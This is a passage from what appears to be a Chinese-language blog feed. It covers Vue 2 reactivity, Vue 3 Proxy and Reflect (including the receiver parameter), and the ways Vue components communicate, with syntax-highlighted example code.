{{str}}</div></code></pre><ol><li>调用$mount()函数进入到挂载阶段</li><li>检查是否有render()函数，根据上述模版创建render()函数</li><li>调用了mountComponent()函数完成挂载，并在mountComponen()中定义并初始化updateComponent()</li><li>为渲染函数添加观察者，在观察者中对渲染函数求值</li><li>在求值的过程中触发数据对象str的get，在str的get中收集str的观察者到数据的dep中</li><li>修改str的值时，触发str的set，在set中调用数据的dep的notify触发响应</li><li>notify中对每一个观察者调用update方法更新视图</li></ol><hr><p>总结下官方的描述,大概分为一下几点：</p><ul><li>组件实例有自己的watcher对象，用于记录数据依赖</li><li>组件中的data的每个属性都有自己的getter、setter方法，用于收集依赖和触发依赖</li><li>组件渲染过程中，调用data中的属性的getter方法，将依赖收集至watcher对象</li><li>data中的属性变化，会调用setter中的方法，告诉watcher有依赖发生了变化</li><li>watcher收到依赖变化的消息，重新渲染虚拟dom，实现页面响应</li></ul><h3 id="Vue-3-0-Proxy"><a href="#Vue-3-0-Proxy" class="headerlink" title="Vue 3.0 Proxy"></a>Vue 3.0 Proxy</h3><blockquote><p> Object.defineProperty 只能劫持对象的属性,因此我们需要对每个对象的每个属性进行遍历。Vue 2.x 里,是通过 递归 + 遍历 data 对象来实现对数据的监控的,如果属性值也是对象那么需要深度遍历,显然如果能劫持一个完整的对象是才是更好的选择。Proxy 可以劫持整个对象,并返回一个新的对象。Proxy 不仅可以代理对象,还可以代理数组。还可以代理动态增加的属性。</p></blockquote><p> Proxy可以理解成，在目标对象之前架设一层 “拦截”，当外界对该对象访问的时候，都必须经过这层拦截，而Proxy就充当了这种机制，类似于代理的含义，它可以对外界访问对象之前进行过滤和改写该对象。 </p><blockquote><p>proxy不存在Object.defineProperty()的三个问题,并且Proxy有多达13种拦截方法 </p></blockquote><pre class=" language-js"><code class="language-js">  <span class="token keyword">var</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p><code>new Proxy()</code>表示生成一个<code>Proxy</code>实例，<code>target</code>参数表示所要拦截的目标对象，<code>handler</code>参数也是一个对象，用来定制拦截行为</p></blockquote><pre class=" language-js"><code class="language-js">  <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'Eason'</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">30</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> handler <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token keyword">get</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>                   <span class="token comment" spellcheck="true">// 如果什么操作也没有就直接return Reflect..</span>      <span class="token comment" spellcheck="true">// return target[key]</span>      <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//函数式行为</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'set'</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// target[key] = value</span>      <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> handler<span class="token punctuation">)</span>  proxy<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Zoe'</span> <span class="token comment" spellcheck="true">// set name Zoe</span>  proxy<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span>     <span class="token comment" spellcheck="true">// set age 18</span>  proxy<span class="token punctuation">.</span>name         <span class="token comment" spellcheck="true">//22 get name</span>                    <span class="token comment" spellcheck="true">//"Eason"</span></code></pre><ul><li><code>proxy</code> 读取属性的值时，实际上执行的是 <code>Handler.get</code> ：在控制台输出信息，并且读取被代理对象 <code>obj</code> 的属性。</li><li><p>在 <code>proxy</code> 设置属性值时，实际上执行的是 <code>Handler.set</code> ：在控制台输出信息，并且设置被代理对象 <code>obj</code> 的属性的值</p><blockquote><p>Reflect是一个内置的对象，没有构造函数，所有的属性与方法都是静态的（就像Math对象）</p><p>Reflect.get():获取对象身上某个属性的值，类似于 target[name]。</p><p>Reflect.set():将值分配给属性的函数,返回一个Boolean，如果更新成功，则返回true。 </p><p>Reflect对象的静态方法和Proxy对象的静态方法一一对应 ，一共13种</p><p>Reflect设计的目的是为了优化Object的一些操作方法以及合理的返回Object操作返回的结果，对于一些命令式的Object行为，Reflect对象可以将其变为函数式的行为 </p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'ace'</span><span class="token punctuation">,</span>  age<span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'name'</span> <span class="token keyword">in</span> obj<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">delete</span> obj<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Reflect<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js">Reflect<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> thisArgument<span class="token punctuation">,</span> argumentsList<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 对一个函数进行调用操作，同时可以传入一个数组作为调用参数。和 Function.prototype.apply() 功能类似。</span>Reflect<span class="token punctuation">.</span><span class="token function">construct</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> argumentsList<span class="token punctuation">[</span><span class="token punctuation">,</span> newTarget<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 对构造函数进行 new 操作，相当于执行 new target(...args)。</span>Reflect<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">,</span> attributes<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 和 Object.defineProperty() 类似。如果设置成功就会返回 true</span>Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//作为函数的delete操作符，相当于执行 delete target[name]。</span>Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">[</span><span class="token punctuation">,</span> receiver<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 获取对象身上某个属性的值，类似于 target[name]。</span>Reflect<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptor</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 类似于 Object.getOwnPropertyDescriptor()。如果对象中存在该属性，则返回对应的属性描述符,  否则返回 undefined.</span>Reflect<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 类似于 Object.getPrototypeOf()。</span>Reflect<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 判断一个对象是否存在某个属性，和 in 运算符 的功能完全相同。</span>Reflect<span class="token punctuation">.</span><span class="token function">isExtensible</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 类似于 Object.isExtensible().</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 返回一个包含所有自身属性（不包含继承属性）的数组。(类似于 Object.keys(), 但不会受enumerable影响).</span>Reflect<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 类似于 Object.preventExtensions()。返回一个Boolean。</span>Reflect<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> propertyKey<span class="token punctuation">,</span> value<span class="token punctuation">[</span><span class="token punctuation">,</span> receiver<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将值分配给属性的函数。返回一个Boolean，如果更新成功，则返回true。</span>Reflect<span class="token punctuation">.</span><span class="token function">setPrototypeOf</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prototype<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 设置对象原型的函数. 返回一个 Boolean， 如果更新成功，则返回true。</span></code></pre><h3 id="Proxy-中的-receiver"><a href="#Proxy-中的-receiver" class="headerlink" title="Proxy 中的 receiver"></a>Proxy 中的 receiver</h3></li></ul><blockquote><p>在 Reflect.get 的场景下，receiver 可以改变计算属性中 this 的指向。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> target <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token keyword">get</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c <span class="token punctuation">}</span><span class="token punctuation">}</span>Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> c<span class="token punctuation">:</span> <span class="token number">4</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 4</span></code></pre><blockquote><p>如果 target 对象中设置了 getter，getter 中的 this 指向 receiver</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/get</span>  <span class="token comment" spellcheck="true">// get语法将对象属性绑定到查询该属性时将被调用的函数。</span>  <span class="token keyword">get</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bar  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token keyword">get</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token string">'value - bar'</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>proxy<span class="token punctuation">.</span>foo<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// console.log(this) => obj</span><span class="token comment" spellcheck="true">// this.bar => undefined</span><span class="token comment" spellcheck="true">// 若 Reflect 中加入 receiver</span><span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// console.log(this) => proxy</span><span class="token comment" spellcheck="true">// this.bar => value - bar</span><span class="token comment" spellcheck="true">// 个人理解：执行 target[key] 是针对于 receiver 执行的</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-Vue组件通信的方式</title>
      <link href="2020/11/12/Vue-Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>2020/11/12/Vue-Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li>$root / $parent / $children</li><li>$refs</li><li>provide / inject</li><li>$attrs / $listeners</li><li>props / $emit</li><li>vuex</li><li>EventBus</li><li>v-model</li></ul><h2 id="root"><a href="#root" class="headerlink" title="$root"></a>$root</h2><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>template<span class="token operator">></span>  <span class="token operator">&lt;</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>      小型应用中可以在 vue 根实例里存储共享数据      组件中可以通过 $root 访问根实例    <span class="token operator">--</span><span class="token operator">></span>    $root<span class="token punctuation">.</span>title：<span class="token punctuation">{</span><span class="token punctuation">{</span> $root<span class="token punctuation">.</span>title <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span>br<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"$root.title = 'Hello $root'"</span><span class="token operator">></span>改变 title<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span></code></pre><h2 id="parent-children"><a href="#parent-children" class="headerlink" title="$parent/$children"></a>$parent/$children</h2><p>指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 <code>this.$parent</code> 访问父实例，子实例被推入父实例的 <code>$children</code> 数组中。</p><p>节制地使用 <code>$parent</code> 和 <code>$children</code> - 它们的主要目的是作为访问组件的应急方法。更推荐用 props 和 events 实现父子组件通信</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> parent<span class="token punctuation">.</span>vue <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"parent"</span><span class="token operator">></span>    parent    <span class="token operator">&lt;</span>child<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>child<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span> <span class="token punctuation">{</span>    child  <span class="token punctuation">}</span><span class="token punctuation">,</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'获取父组件实例'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    handle <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>title<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> children<span class="token punctuation">.</span>vue <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"child"</span><span class="token operator">></span>    child<span class="token operator">&lt;</span>br<span class="token operator">></span>    $parent<span class="token punctuation">.</span>title：<span class="token punctuation">{</span><span class="token punctuation">{</span> $parent<span class="token punctuation">.</span>title <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>br<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"$parent.handle"</span><span class="token operator">></span>获取 $parent<span class="token punctuation">.</span>title<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"$parent.title = 'Hello $parent.title'"</span><span class="token operator">></span>改变 $parent<span class="token punctuation">.</span>title<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span>grandson<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>grandson<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span></code></pre><h2 id="refs"><a href="#refs" class="headerlink" title="$refs"></a>$refs</h2><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> parent<span class="token punctuation">.</span>vue <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>  <span class="token operator">&lt;</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>myinput ref<span class="token operator">=</span><span class="token string">"mytxt"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>myinput<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"focus"</span><span class="token operator">></span>获取焦点<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span> <span class="token punctuation">{</span>    myinput  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    focus <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>mytxt<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 调用的是子组件的 focus 方法</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>mytxt<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'hello'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> myinput<span class="token punctuation">.</span>vue <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>  <span class="token operator">&lt;</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>input v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"value"</span> type<span class="token operator">=</span><span class="token string">"text"</span> ref<span class="token operator">=</span><span class="token string">"txt"</span><span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      value<span class="token punctuation">:</span> <span class="token string">'default'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    focus <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>txt<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// this.$refs.txt 获取 DOM 对象，focus 方法获取焦点</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="provide-inject"><a href="#provide-inject" class="headerlink" title="provide/inject"></a>provide/inject</h2><blockquote><p><code>provide</code> 和 <code>inject</code> 主要在开发高阶插件/组件库时使用。并不推荐用于普通应用程序代码中。</p></blockquote><p>这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在其上下游关系成立的时间里始终生效。如果你熟悉 React，这与 React 的上下文特性很相似。</p><p><strong>提示：<code>provide</code> 和 <code>inject</code> 绑定并不是可响应的。这是刻意为之的。然而，如果你传入了一个可监听的对象，那么其对象的 property 还是可响应的。并且在子组件中不可修改</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 父级组件提供 'foo'</span><span class="token keyword">var</span> Provider <span class="token operator">=</span> <span class="token punctuation">{</span>  provide<span class="token punctuation">:</span> <span class="token punctuation">{</span>    foo<span class="token punctuation">:</span> <span class="token string">'bar'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 子组件注入 'foo'</span><span class="token keyword">var</span> Child <span class="token operator">=</span> <span class="token punctuation">{</span>  inject<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  created <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>foo<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// => "bar"</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span></code></pre><h2 id="attrs-listeners"><a href="#attrs-listeners" class="headerlink" title="$attrs / $listeners"></a>$attrs / $listeners</h2><ul><li>$attrs ：把父组件中非 prop 属性绑定到内部组件</li><li>$listeners：把父组件中的 DOM 对象的原生事件绑定到内部组件</li><li>可查看文章<a href="https://www.cnblogs.com/chanwahfung/p/11520909.html" target="_blank" rel="noopener">Vue - 组件通信之$attrs、$listeners</a></li><li><a href="https://juejin.cn/post/6844904166167429133" target="_blank" rel="noopener">如何理解vue中的native</a></li></ul><h2 id="props-emit"><a href="#props-emit" class="headerlink" title="props / $emit"></a>props / $emit</h2><blockquote><p>父组件通过props向子组件传递数据，子组件通过$emit触发父组件的方法，从而实现子到父的通信</p></blockquote><h4 id="父组件传子组件：通过props"><a href="#父组件传子组件：通过props" class="headerlink" title="父组件传子组件：通过props"></a>父组件传子组件：通过props</h4><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>父组件<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>我是父组件<span class="token punctuation">,</span>我的值是<span class="token punctuation">{</span><span class="token punctuation">{</span> msg <span class="token punctuation">}</span><span class="token punctuation">}</span>        <span class="token operator">&lt;</span>child <span class="token punctuation">:</span>logo<span class="token operator">=</span><span class="token string">"msg"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>child<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">import</span> child <span class="token keyword">from</span> <span class="token string">'./child'</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      msg<span class="token punctuation">:</span> <span class="token string">'123'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  components<span class="token punctuation">:</span> <span class="token punctuation">{</span>    child  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>子组件<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>div<span class="token operator">></span>我是子组件<span class="token punctuation">,</span>这是父组件的值：<span class="token punctuation">{</span><span class="token punctuation">{</span> logo <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'child'</span><span class="token punctuation">,</span>  data <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  props<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'logo'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    我是父组件<span class="token punctuation">,</span>我的值是<span class="token number">123</span>    我是子组件<span class="token punctuation">,</span>这是父组件的值：<span class="token number">123</span><span class="token operator">--</span><span class="token operator">></span></code></pre><h4 id="子组件传父组件：-emit"><a href="#子组件传父组件：-emit" class="headerlink" title="子组件传父组件：$emit"></a>子组件传父组件：$emit</h4><ul><li>输入框的onchange事件，要在 input 失去焦点的时候才会触发；</li><li>oninput 事件在用户输入时触发，它是在元素值发生变化时立即触发；</li></ul><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>父组件<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>child @transfer<span class="token operator">=</span><span class="token string">"get"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>child<span class="token operator">></span>        <span class="token operator">&lt;</span>div<span class="token operator">></span>我是父组件：这是子组件传来的值：<span class="token punctuation">{</span><span class="token punctuation">{</span> msg <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span 